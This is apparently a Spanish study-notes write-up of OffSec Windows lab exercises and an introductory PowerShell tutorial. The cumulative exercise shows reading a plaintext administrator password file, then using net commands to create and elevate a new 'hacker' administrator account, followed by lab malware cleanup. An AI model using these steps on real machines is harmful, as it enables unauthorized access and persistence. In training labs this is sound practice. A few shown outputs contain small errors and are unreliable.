**2. ¿Cuál es el indicador dentro del archivo oculto que usa un flujo de datos alternativo dentro del directorio C:\\Users\\Offsec\\Desktop\\streamtest en la máquina de destino?**

Empleamos el siguiente comando:

```
offsec@WINDOWS-03 C:\Users\Offsec\Desktop\streamtest>more < six.txt:try:$DATA        
OS{hiders-hiding-hidden-hides-in-hideaways}
```

<br />

**3. Hay una unidad no estándar en la máquina de destino. Encuéntralo y luego localiza la bandera.**

Utilizamos la suite de fsutil con el siguiente comando:

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>fsutil fsinfo drives 

Drives: C:\ D:\ O:\
```

<br />

De esta forma, como tenemos la seguridad de que está montada, acudimos a el y listamos los contenidos del directorio raíz de la unidad 'O:\\':

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>dir O:\
 Volume in drive O has no label.
 Volume Serial Number is A23F-A475

 Directory of O:\

12/16/2021  02:58 PM                41 flag.txt
               1 File(s)             41 bytes
               0 Dir(s)      90,058,752 bytes free

offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>type O:\flag.txt
OS{driving-lessons-were-never-this-fun}
```

<br />

**4. ¿Qué unidad de la máquina de destino contiene el CD-ROM?**

Con drivetype podemos ver que es la letra D:

<br />

**5. Es importante reiniciar la máquina al hacer esto. ¿Cuál es el tamaño total en disco de C:\\Users\\Offsec\\Desktop y todos sus subdirectorios?

```
offsec@WINDOWS-03 C:\Users\Offsec\Downloads\SysinternalsSuite>du.exe /accepteula C:\Users\Offsec\Desktop

DU v1.62 - Directory disk usage reporter
Copyright (C) 2005-2018 Mark Russinovich
Sysinternals - www.sysinternals.com

Files:        20
Directories:  4
Size:         54,903 bytes
Size on disk: 139,312 bytes
```

<br />

#### 1.14. Windows Cumultative Exercise.

**1.  Inicie sesión en el destino con las credenciales de bajo nivel proporcionadas Offsec:Offsec. Busque en el sistema cualquier archivo de contraseña para ver si puede determinar las credenciales de un usuario administrativo. Usando estas credenciales administrativas, cree una segunda cuenta administrativa llamada "hacker" e inicie sesión como este nuevo usuario. ¿Cuál es el nombre del archivo que contiene la contraseña del administrador?**

Iniciamos sesión con el siguiente comando:

```
rdesktop -u Offsec -p Offsec 192.168.96.54
```

Seguidamente, intentamos rebuscar un poco sobre el directorio del usuario pero no encontramos nada. Fuera del directorio del usaurio (al tener uno con bajos privilegios) no tenemos acceso a casi nada dentro del volumen C:\\. De esta forma, intentamos ver si existen otros volumenes disponibles en el systema empleando *fsutil*:

```
C:\Users\Offsec>fsutil fsinfo drives

Drives: C:\ D:\ S:\

C:\Users\Offsec>fsutil fsinfo drivetype D:\
D:\ - CD-ROM Drive

C:\Users\Offsec>fsutil fsinfo drivetype S:\
S:\ - Fixed Drive
```

Vemos que la unidad D se corresponde con un CD-ROM, y que la unidad S:\\ está fija. Con lo que eploramos la unidad S:\

```
C:\Users\Offsec>fsutil fsinfo drivetype S:\
S:\ - Fixed Drive

C:\Users\Offsec>dir /a /s /b S:\
S:\$RECYCLE.BIN
S:\data
S:\System Volume Information
S:\$RECYCLE.BIN\S-1-5-21-856803533-2522691987-786685272-1002
S:\$RECYCLE.BIN\S-1-5-21-856803533-2522691987-786685272-500
S:\$RECYCLE.BIN\S-1-5-21-856803533-2522691987-786685272-1002\desktop.ini
S:\data\mybestpasswords.txt
```

Entonces vemos que el último fichero puede ser de interés:

```
C:\Users\Offsec>type S:\data\mybestpasswords.txt
Administrator:BeefyForehandAttack686
```

Así, utilizamos el comando 'runas' dado que tenemos acceso a través de la GUI.

Ahora que tenemos privilegios administrativos sobre la máquina vamis a crear un usuario nuevo llamado 'Hacker' al que vamos a añadir a los grupos de 'Remote Desktop Users' y 'Administrators' para poder logearnos como él con GUI y además permitile tener privilegios administrativos.

Empleamos la siguiente cadena de comandos con 'net':

```
C:\>net user /add hacker Password1234
The command completed successfully.

C:\>net localgroup Administrators hacker /add
The command completed successfully.

C:\>net localgroup "Remote Desktop Users" hacker /add
The command completed successfully.
```

Y revisamos el usuario con:

```
C:\>net user hacker
User name                    hacker
Full Name
Commen
User's commen
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2023 11:53:28 AM
Password expires             3/11/2023 11:53:28 AM
Password changeable          1/28/2023 11:53:28 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon scrip
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users
                             *Users
Global Group memberships     *None
```

Y podemos observar que efectivamente forma parte de todos aquellos grupos que nos convienen. 

Ahora, cerramos la conexión con Offsec y la abrimos con hacker en rdesktop.

```
rdesktop -u hacker -p Password1234 <IP>
```

<br />

**2.  Hay un binario llamado _account-check.exe_ en el escritorio del administrador. Rdesktop como el nuevo usuario "hacker" y en una ventana de comando, con privilegios elevados, ejecute el binario para verificar que el usuario sea parte del grupo Administradores. ¿Cuáles son los contenidos de la bandera?**

Acudimos al escritorio del adminstrador abriendo una cmd como administrador poniendo cmd en la barra de búsqueda y seleccionando "Execute as adminstrator". Esto se nos permite porque estamos en el grupo 'Administrators'. Seguidamente acudimos al escritorio del directorio home del administrador y ejeecutamos el binario:

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7ADD-E6C8

 Directory of C:\Users\Administrator\Desktop

09/09/2021  09:32 AM    <DIR>          .
09/09/2021  09:32 AM    <DIR>          ..
07/07/2021  04:04 AM             7,168 account-check.exe
07/07/2021  05:27 AM             6,656 cleaning.exe
07/07/2021  05:12 AM             6,144 halting.exe
               3 File(s)         19,968 bytes
               2 Dir(s)   5,935,906,816 bytes free

C:\Users\Administrator\Desktop>account-check.exe
Well Administered! Your flag is:
OS{this-is-my-flagship-now}
```


<br />

**3.  El cliente le ha dicho que esta máquina en particular estaba actuando de manera extraña recientemente y que esta extraña pantalla de comando aparece cada vez que se reinicia la computadora. Examine la lista de tareas para ver si se está ejecutando algún proceso extraño en este cuadro. ¿Cuál es el nombre del proceso de malware?**

Ejecutamos el comando 'tasklist' para ver los procesos en ejecucición en la máquina a através de la CMD y seguidamente observamos que hay un proceso sospechoso:

```
C:\Users\Administrator\Desktop>tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============

[...]

malcolmswarehouse.exe         8396 RDP-Tcp#3                  3        284 K

[...]
```

<br />

**4.  Ahora que ha encontrado un proceso malicioso, asegúrese de detenerlo. Use el archivo binario _halting.exe_ en el escritorio del administrador para verificar que el malware haya sido eliminado. ¿Cuáles son los contenidos de la bandera?**

Para esta tarea vamos a emplear dos comandos, taskkill y tasklist. 

Por un lado, como conocemos el nombre de la imagen del proceso, empleamos el siguiente comando:

```
C:\Users\Administrator\Desktop>tasklist /FI "Imagename eq malcolmswarehouse.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
malcolmswarehouse.exe         6116                            2        280 K
malcolmswarehouse.exe         8396 RDP-Tcp#3                  3        300 K
```

Obtenemos dos instancias del malware, así empleamos *taskkill* y:

```
C:\Users\Administrator\Desktop>taskkill /F /FI "Imagename eq malcolmswarehouse.exe"
SUCCESS: The process with PID 6116 has been terminated.

C:\Users\Administrator\Desktop>tasklist /FI "Imagename eq malcolmswarehouse.exe"
INFO: No tasks are running which match the specified criteria.
```

La opción /F se utiliza para forzar la finalización del programa. Luego volvemos a intentar listar los procesos para asegurarnos de que hemos completado la terminación.

Finalmente, obtenemos la flag:

```
C:\Users\Administrator\Desktop>halting.exe
Great! Your flag is:
OS{this-program-halts-after-all!}
```


<br />

**5.  ¿Cuál es el nombre de la clave de registro utilizada para iniciar el proceso malicioso? (ingrese la ruta de registro, menos el nombre del archivo)**

Observemos que como el ejecutable estaba corriendo al iniciar nosotros la máquina y además con un usuario creado, esto significa que el malware se ejecuta cada vez que un usuario cualquiera se logea. Por lo tanto, si está guardado en el registro hay 4 posibilidades, a saber:

```
HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 
HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
```

El hecho de que se haya iniciado cuando nosotros (un usuario recién creado) nos hemos logeado descarta la posibilidad de que esté en el HKEY_CURRENT_USER pues eso significaría que alguien ha puesto la clave en nuestro registro exactamente cuando lo hemos creado.

Además, lo mismo aplica al hecho de que sólo se ejecute una vez pues nadie puede haberlo hecho antes, la opción más razonable debe ser que ejecute para todos los usuarios siempre, y la clave para ello es:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```

Una simple búsqueda puede corroborar nuestra teoría:

```
C:\Users\Administrator\Desktop>reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    VMware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
    VMware VM3DService Process    REG_SZ    "C:\WINDOWS\system32\vm3dservice.exe" -u
    mcwh    REG_SZ    "C:\malcolmswarehouse.exe"
```

<br />

**6.  Ahora que ha eliminado el proceso malicioso, elimine la entrada del registro que lo inicia. Finalmente, elimine el binario malicioso del disco. Luego use el archivo binario _cleaning.exe_ (en el escritorio del administrador) para verificar que el malware se eliminó por completo del sistema. ¿Cuáles son los contenidos de la bandera?**

Primero eliminamos la clave del registro:

```
C:\Users\Administrator\Desktop>reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    VMware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
    VMware VM3DService Process    REG_SZ    "C:\WINDOWS\system32\vm3dservice.exe" -u
    mcwh    REG_SZ    "C:\malcolmswarehouse.exe"
    
C:\Users\Administrator\Desktop>REG DELETE HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v mcwh /f
The operation completed successfully.

C:\Users\Administrator\Desktop>reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    VMware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
    VMware VM3DService Process    REG_SZ    "C:\WINDOWS\system32\vm3dservice.exe" -u
```

Listamos y ibservamos que el valor de la clave que carga el malware es 'mcwh'. Segudiamente, el comando indica que queremos borrar de la clave HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run el valor mcwh que es el valor que contiene por string la imagen del malware según sabemos y además lo borra forzadamente (/f).

Por último, volvemos a listar para asegurarnos de que nos hemos deshecho de la clave.

Ahora, borramos el ejecutable que según indicaba la clave del registro se encontraba en el directorio raiz.

```
C:\>del malcolmswarehouse.exe

C:\>malcolmswarehouse.exe
'malcolmswarehouse.exe' is not recognized as an internal or external command,
operable program or batch file.
```

Y obtenemos la flag.

```
C:\Users\Administrator\Desktop>cleaning.exe
Very nice! Your flag is:
OS{too-bad-so-sad-bye-bye}
```

<br />




### 2. PowerShell Scripting Basics.

Windows PowerShell es un lenguaje de automatización de tareas y administración de servicios que Windows presentó para ampliar la limitada funcionalidad de los ficheros [batch](https://en.wikipedia.org/wiki/Batch_file) los cuales son ficheros orientado a la creación de scripts de comandos de CMDs.

En este apéndice vamos a tener un mejor entendimiento de la fuerza de PowerShell, de sus posibles usos y de sus limitaciones.

<br />

#### 2.1. Introduction to PowerShell.

**Definición**

Técnicamente, Windows PowerShell se define como un [lenguaje de programación orientado a objetos](https://openwebinars.net/blog/que-es-la-programacion-orientada-objetos/#:~:text=Lenguajes%20de%20Programaci%C3%B3n%20Orientada%20a%20Objetos,-Para%20considerar%20un&text=Actualmente%20existen%20una%20gran%20variedad,%2C%20Smalltalk%2C%20PHP%20o%20Python.) (tal y como lo es Java por ejemplo) basado en el [.NET Framework](https://en.wikipedia.org/wiki/.NET_Framework) (un framework de programación creado por Microsoft).

En contraste con Bash que se trata de un lenguaje orientado a lectura y escritura de ficheros, PowerShell trabaja con objetos .NET que son instancias de clases que tienen métodos y atributos. De esta forma, la acción del código está basada sobre objetos, la acción de estos objetos es la que produce la acción del código de una manera mucha más conceptual dejando atrás la programación procedural.

<br />

**Desplegar una shell de PowerShell**

La forma que más interesa a un pentester de desplegar una shell de powershell es a través de una CMD (más adelante veremos de que PowerShell tiene su propio IDE que puede ser más interesante para un administrador o a un programador, pero rara vez un pentester tendrá acceso de forma inicial a un IDE). 

Una vez tenemos acceso a un entorno de ejecución de comandos en una máquina Windows 7 os superior podemos hacer uso del comando 'powershell' para o bien entrar en un entorno de powershell o ejecutar un comando de powershell con 'powershell -c':

```powershell
C:\Users\offsec>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform Powershell http://aka.ms/pscore6

PS C:\Users\offsec>Get-Service

Status   Name               DisplayName
------   ----               -----------
Stopped  AarSvc_49d30       Agent Activation Runtime_49d30
Stopped  AJRouter           Servicio de enrutador de AllJoyn
Stopped  ALG                Servicio de puerta de enlace de niv...
Stopped  AppIDSvc           Identidad de aplicación
Running  Appinfo            Información de la aplicación
Stopped  AppReadiness       Preparación de aplicaciones
Running  AppXSvc            Servicio de implementación de AppX ...
Running  AudioEndpointBu... Compilador de extremo de audio de W...
Running  Audiosrv           Audio de Windows
Stopped  autotimesvc        Hora de la red de telefonía móvil
Stopped  AxInstSV           Instalador de ActiveX (AxInstSV)
Stopped  BcastDVRUserSer... Servicio de usuario de difusión y G...
Stopped  BDESVC             Servicio Cifrado de unidad BitLocker
Running  BFE                Motor de filtrado de base
Stopped  BITS               Servicio de transferencia inteligen...
Stopped  BluetoothUserSe... Servicio de soporte técnico de usua...
Running  BrokerInfrastru... Servicio de infraestructura de tare...
Stopped  Browser            Examinador de equipos
Running  BTAGService        Servicio de puerta de enlace de aud...
Running  BthAvctpSvc        Servicio AVCTP
Running  bthserv            Servicio de compatibilidad con Blue...
Running  camsvc             Servicio Administrador de funcional...
Running  CaptureService_... CaptureService_49d30
...
```

<br />

```powershell
C:\Users\offsec>powershell -c Get-Service

Status   Name               DisplayName
------   ----               -----------
Stopped  AarSvc_49d30       Agent Activation Runtime_49d30
Stopped  AJRouter           Servicio de enrutador de AllJoyn
Stopped  ALG                Servicio de puerta de enlace de niv...
Stopped  AppIDSvc           Identidad de aplicación
Running  Appinfo            Información de la aplicación
Stopped  AppReadiness       Preparación de aplicaciones
Running  AppXSvc            Servicio de implementación de AppX ...
Running  AudioEndpointBu... Compilador de extremo de audio de W...
Running  Audiosrv           Audio de Windows
Stopped  autotimesvc        Hora de la red de telefonía móvil
Stopped  AxInstSV           Instalador de ActiveX (AxInstSV)
Stopped  BcastDVRUserSer... Servicio de usuario de difusión y G...
Stopped  BDESVC             Servicio Cifrado de unidad BitLocker
Running  BFE                Motor de filtrado de base
Stopped  BITS               Servicio de transferencia inteligen...
Stopped  BluetoothUserSe... Servicio de soporte técnico de usua...
Running  BrokerInfrastru... Servicio de infraestructura de tare...
Stopped  Browser            Examinador de equipos
Running  BTAGService        Servicio de puerta de enlace de aud...
Running  BthAvctpSvc        Servicio AVCTP
Running  bthserv            Servicio de compatibilidad con Blue...
Running  camsvc             Servicio Administrador de funcional...
Running  CaptureService_... CaptureService_49d30
...
```

Para concer la versión de powershell que estamos utilizando podemos desplegar los contenidos de la variable ''$PSVersionTable':

```powershell
PS C:\Users\offsec> $PSVersionTable
Name                           Value
----                           -----
PSVersion                      5.1.19041.1320
...
```

Por otra parte, si tenemos acceso a un entorno GUI (Interfaz Gráfica) podemos tener acceso al IDE de PowerShell. IDE atiende a (Integrated Development Enviroment) y es un entorno de desarrollo del lenguaje de un lenguaje de programación específico. Podemos acceder escribiendo 'PowerShell' sobre la barra de búsqueda y seleccionando la opción Windows PowerShell ISE:


<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208184106.png' | relative_url }}" text-align="center"/>
</div>

Esto nos dara acceso a una interfaz en la que existe una consola de comandos además de otras características especificas del IDE:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208184224.png' | relative_url }}" text-align="center"/>
</div>

Los ejercicios estarán resueltos en el IDE.

<br />

#### 2.2. CmdLets.

**Definición. Cmdlet vs Command.**

PowerShell está basado en un tipo particular de programas denominados como CmdLets. Estos son algo así como los comandos de PowerShell, en el sentido de que son nombres que tienen asociado una funcionalidad dentro del lenguaje. Sin embargo, no pueden ser denominados 'comandos' como tal porque no lo son.

Esencialmente, un comando es un programa que ha sido compilado y que puede ejecutarse de forma independiente, en sí mismo (o si acaso, con la dependencia de algunas librerías pero que podrían estar incluidas en el propio código del comando). Por ejemplo, los comandos de Bash son programas autocontenidos que trabajan sobre ficheros.

Un CmdLet técnicamente es una clase de objeto del marco .NET que trabaja sobre otros objetos. Esto implica por otra parte que un CmdLet está pensado para formar parte siempre de un proceso modular (invocando métodos de objetos y concatenando varios CmdLets) y por tanto, como programa, es más liviano que un comando convencional, en el sentido de que como no está pensado para ejecutarse y ofrecer un resultado en sí mismo no tiene asociado un manejo de errores otras funcionalidades que si se requieren dentro de un comando.

<br />

**Ejemplos y cmdlets comúnes**

La estructura de los CmdLets es siempre la combinación de un verbo y un nombre separados por un guión. Por ejemplo: 'Get-Help', 'Set-ADAccount', etc. Estos nombres hacen que la funcionalidad del cmdlet sea más intuitiva.

Podemos obtener una lista de verbos con el cmdlet *Get-Verb*:

```powershell
PS C:\WINDOWS\system32> Get-Verb

Verb        Group
----        -----
Add         Common
Clear       Common
...
Trace       Diagnostic
Connect     Communications
Disconnect  Communications
Read        Communications
Receive     Communications
Send        Communications
Write       Communications
Block       Security
Grant       Security
Protect     Security
...
```

Otro de los cmdlets más útiles sería Get-Help, este, como el propio nombre indica, despliega ayuda sobre otros cmdlets o elementos de PowerShell:

```powershell
PS C:\WINDOWS\system32> Get-Help Get-Help

NAME
    Get-Help

SYNOPSIS
    Displays information about PowerShell commands and concepts.
    
SYNTAX
...
DESCRIPTION
...
```

Es importante mantener la ayuda actualizada con Update-Help como administrador, es especialmente importante de cara a la Importanción de Modulos de powershell para tener accesible ayuda sobre nuevos cmdlets.

<br />

**Parámetros**

Los parámetros son términos que siguien a un guión y que expanden la funcionalidad de un cmdlet. Fijándonos en la ayuda de Get-Help podemos ver un parámetro:

```powershell
...
SYNTAX
    Get-Help [[-Name] <System.String>]
...
```

De esta forma, también podríamos invocar al comando a través de:

```
PS C:\WINDOWS\system32> Get-Help -Name "Get-Help"

NAME
    Get-Help
...
```

Cualquier parámetro de PowerShell viene precedido por un guión (-) y está compuesto por un nombre y un valor asociado que algunas veces hay que especificar y otras veces no. Como hemos visto en el ejemplo anterior, -Name sería el nombre del parámtero y Get-Help sería el valor asociado entre comillas indicando que se trata de un String.

En el acaso de la ayuda, a través de parámetros podemos pedir una información más detallada del comando o bien pedir ejemplo:

```
...
SYNTAX
    Get-Help [[-Name] <System.String>] [-Category {Alias | Cmdlet | Provider | General | FAQ | Glossary | HelpFile | ScriptCommand | Function | Filter | ExternalScript | All | DefaultHelp | DscResource | Class | Configuration}] [-Component <System.String[]>] -DETAILED [-Functionality <System.String[]>] [-Path <System.String>] [-Role <System.String[]>] [<CommonParameters>]
    Get-Help [[-Name] <System.String>] [-Category {Alias | Cmdlet | Provider | General | FAQ | Glossary | HelpFile | ScriptCommand | Function | Filter | ExternalScript | All | DefaultHelp | DscResource | Class | Configuration}] [-Component <System.String[]>] -EXAMPLES [-Functionality <System.String[]>] [-Path <System.String>] [-Role <System.String[]>] [<CommonParameters>]
...
```

<br />

```
PS C:\WINDOWS\system32> Get-Help -Name "Get-Help" -Examples

NAME
    Get-Help
    
SYNOPSIS
    Displays information about PowerShell commands and concepts.
    
    --- Example 1: Display basic help information about a cmdlet ---
...
```

<br />

```
PS C:\WINDOWS\system32> Get-Help -Name "Get-Help" -Detailed

NAME
    Get-Help

...    
PARAMETERS
...
   -Detailed <Sytem.Management.Automatic.SwitchParameter>
       Adds parameter descriptions and examples to the basic help display...
```

<br />

**Alias**

Como sabemos de Bash en el apartado anterior, un alias es un nombre que sirve como shortcut para un comando de nombre más amplio. Así, 'help' es un alias de 'Get-Help':

```powershell
PS C:\WINDOWS\system32> help Get-Help

NAME
    Get-Help

SYNOPSIS
    Displays information about PowerShell commands and concepts.
...
```

Podemos tener una lista de alias mediante y además especificar si un determinado término está asociado a un comando:

```
PS C:\WINDOWS\system32> Get-Alias -Definition "help"

CommandType    Name                Version    Source
___________    ____                _______    ______
Alias          man -> help
...
```

Y podemos setear Alias con:

```
PS C:\WINDOWS\system32> Set-Alias -Name gh -Value Get-Help

PS C:\WINDOWS\system32> Get-Alias -Name gh

CommandType    Name                Version    Source
___________    ____                _______    ______
Alias          gh -> Get-Help
...
```

<br />

**Ejercicios**

¿Qué cmdlet nos presenta información detallada sobre los comandos de PowerShell?: Get-Help.

¿Cuántos alias existen para el cmdlet Get-ChildItem?: Get-Alias -Definition Get-ChildItem

¿Cuántos cmdlets hay con el verbo "Save"?: Get-Command -Verb Save

¿Qué parámetro de Get-Verb no está disponible en PowerShell 5.1. pero sí en versiones anteriores?: Group

¿Cuál es el título del décimo ejemplo de Get-Command?: Get-Help -Examples Get-Command y bajar hasta el décimo ejemplo > Get an alias.

<br />

##### 2.2.3. Variables.

**Definición de Variable.**

Una variable es un contenedor que almacena datos. En PowerShell se utiliza el operador '=' para declarar y asignar un valor a una variable al mismo tiempo:

```powershell
PS C:\WINDOWS\system32> $myString = "ABC123!@#"
PS C:\WINDOWS\system32> $myString
ABC123!@#
```

Toda variable debe empezar por '$'.

<br />

**Data Types**

Los datos se distinguen por tipos en función del tipo de dato que sean (String, Int, Float, etc). Una forma de saber qué tipo de dato contiene una variable es utilizar el método ".GetType()" sobre dicha variable:

```powershell
PS C:\WINDOWS\system32> $myString.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     String                          System.Object

PS C:\WINDOWS\system32> $myInt = 1903

PS C:\WINDOWS\system32> $myInt
1903

PS C:\WINDOWS\system32> $myInt.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int32                           System.ValueType

PS C:\WINDOWS\system32> $a = 100.5

PS C:\WINDOWS\system32> $a.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Double                          System.ValueType

PS C:\WINDOWS\system32> $b = 5000000000

PS C:\WINDOWS\system32> $b.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int64                           System.ValueType

PS C:\WINDOWS\system32> $False.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Boolean   

PS C:\WINDOWS\system32> $True.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Boolean

PS C:\WINDOWS\system32> $array1="blue","black","yellow","white","orange"

PS C:\WINDOWS\system32> $array1.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Object[]                        System.Array
```

<br />

**Arrays**

Especialmente interesante es el último objeto. Este objeto es un tipo array que consiste en una colección de objetos. Como podemos ver es una variable que contiene diversos datos separados por comas. Cada uno de estos datos se identifican por un índice desde el 0 y son accesibles de la siguiente forma:

```powershell
PS C:\WINDOWS\system32> $array1[0]
blue

PS C:\WINDOWS\system32> $array1[3]
white
```

<br />

**Operaciones entre variables**

Las variables, al ser contenedores de datos, pueden ser utilizadas para operar de la misma forma que lo haríamos con los mismos datos. En este sentido podemos realizar operaciones matemáticas o concatenar cadenas de caracteres:

``` powershell
PS C:\WINDOWS\system32> $a = 123

PS C:\WINDOWS\system32> $b = 456

PS C:\WINDOWS\system32> $a + $b
579

PS C:\WINDOWS\system32> $b + $a
456123

PS C:\WINDOWS\system32> $String1="Hola"

PS C:\WINDOWS\system32> $String1="Adios"

PS C:\WINDOWS\system32> $String1 + $String2
HolaAdios

PS C:\WINDOWS\system32> $String1 + " " + $String2
Hola Adios
```

Pero sin ninguna duda, la operación más interesante que podemos hacer es el casting, que consiste en pasar datos de un tipo a otro tipo. 

Consideremos el siguiente ejemplo:

```powershell
PS C:\WINDOWS\system32> $b = "456"

PS C:\WINDOWS\system32> $a = 123
```

La variable anterior, 'b', aun siendo un número es de hecho un tipo 'String' tal y como podemos ver utilizando el método en cuestión:

```powershell
PS C:\WINDOWS\system32> $a.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int32                           System.ValueType

PS C:\WINDOWS\system32> $b.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     String                          System.Object
```

Sin embargo, podemos realizar un casteo de esta variable como sigue:

```powershell
PS C:\WINDOWS\system32> ([int]$b).GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int32                           System.ValueType
```

Podemos observar que \[int\]$b ya no es una cadena de caracteres sino un valor entero. Lo mismo es aplicable a otra serie de datos, para mas información se tiene el siguiente [link](https://www.aulafacil.com/cursos/programacion/en-c/casting-de-datos-l17890#:~:text=Los%20casting%20en%20programaci%C3%B3n%20se,sistema%20de%20conversi%C3%B3n%20como%20tal.)

<br />

**Variables conocidas**

Algunas variables que powershell contiene por defecto son:

-   **$Error** contiene una matriz de objetos de error.

-   **$Host** contiene información sobre la aplicación de alojamiento actual.

-   **$Profile** contiene la ruta al perfil de usuario actual para PowerShell.

-   **$PID** contiene el ID de proceso de la sesión actual de PowerShell.

-   **$PSUICulture** contiene la referencia cultural de la interfaz de usuario o el idioma regional de la interfaz de usuario.

-   **$NULL** contiene el valor de NULL.

-   **$False** contiene el valor de False.

-   **$True** contiene el valor de True.

<br />

**Ejercicios**

¿Cuál es el valor del _total_ en el siguiente bloque de código de PowerShell?

```
$x = "123.5"
$y = 456
$z = .25
$total = $x + $y + $z
```

Copiar el código en el ISE y ver el valor de la variable $total.

<br />

Si quisiéramos convertir la variable _x_ de cadena a doble para sumar los tres números, ¿qué sintaxis necesitaríamos agregar delante de _x_ en la última línea del programa?: \[double\]

<br />

¿Cuál es el resultado de la ecuación "fija" de la pregunta 2?:

Copiar el código 

```bash
[double]$x = "123.5"
$y = 456
$z = .25
$total = $x + $y + $z
```

Y mostrar el resultado de la variabl $total.

<br />

¿Cuál es el resultado de la última instrucción?

```
PS C:\WINDOWS\system32> $myArray=1,2,3,4,5

PS C:\WINDOWS\system32> $myArray[3]
```

<br />

##### 2.2.4. Operadores.

Un operador es un caracter que se utiliza dentro de una expresión para obtener un resultado a partir de uno o varios objetos. Distinguimos esencialmente entre:

- *Asignador*, '=': Se utiliza para asignar o manipular valores de variables.
- *Arithemtic*: Sirven para realizar operaciones matemáticas como '+' o '-'. Especial mencion merece el operador monádico incremento (++) o decremento (--) o el operador módulo (%).
- *Comparison*: Comparan objetos para ver si son iguales en algún aspecto, '-eq'.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221209124831.png' | relative_url }}" text-align="center"/>
</div>

- *Logical*: Operador usado para conectar dos o más expresiones '-and' y '-or'.

```powershell
PS C:\WINDOWS\system32> ($num1 -le 10) -and ($num2 -le 10)
True
```

<br />

```powershell
PS C:\WINDOWS\system32> ($num1 -lt 10) -or ($num2 -lt 10)
True
```

<br />

##### 2.2.5. Conditional Statements and Loops.

Hasta ahora hemos visto elementos básicos como variable y formas de interactuar y sacar conclusiones con esta variable. Ahora vamos a ver herramientas que nos van a ayudar a gestionar el control del flujo del código; estamos hablando de los bucles y las sentencias condicionales, que nos permitirán dirigir el curso del código en base a respuesta automatizadas.

<br />

**If/Else conditional statement**

El statement If/Else permite al código elaborar decisiones en base al valor booleano de una condición. Si este valor es verdadero se ejecutará un bloque de código y si es faldo se ejecutará el bloque de código perteneciente al término 'Else'. La sintaxis específica de este statement es como sigue:

```powershell
PS C:\WINDOWS\system32> if (<condition>)
{
  <code1>
}
else
{
 <code2>
}
```

Por ejemplo:

```powershell
PS C:\WINDOWS\system32> if(80 -ge 70)
{
  Write-Output "Passed"
}
else
{
  Write-Output "Failed"
}
Passed
```

<br />

**Switch**

Conceptualmente este statemente es una extensión del If/Else a más de dos casos. El statement *Switch* compara un valor dado con un conjunto de posibles casos comtemplados para el valor de dicho dato y en función de cada caso ejecuta un bloque de código.

```
PS C:\WINDOWS\system32> switch ($var)
{
  <case1>{<code>}
  <case2>{<code>}
  ...
}
OUTPUT
```

Un ejemplo sería:

```powershell
PS C:\WINDOWS\system32> $number1 = 4

PS C:\WINDOWS\system32> switch ($number1)
{
  1{Write-Output "Number is 1"}
  2{Write-Output "Number is 2"}
  3{Write-Output "Number is 3"}
  4{Write-Output "Number is 4"}
  5{Write-Output "Number is 5"}
}
Number is 4
```

<br />

**For and While Loops**

Los bucles for y while son un statements que nos permiten repetir un bloque de código hasta que se cumple una determinada condición.

Concretamente, el bucle for está orientado a repetir el bloque un número concreto de veces variando una o varias partes concretas del código en cada iteración. 

Por ejemplo:

```powershell
PS C:\WINDOWS\system32> for ($myVar=0; $myVar -lt 5; $myVar++)
{
  Write-Output $myVar;
}
0
1
2
3
4
```

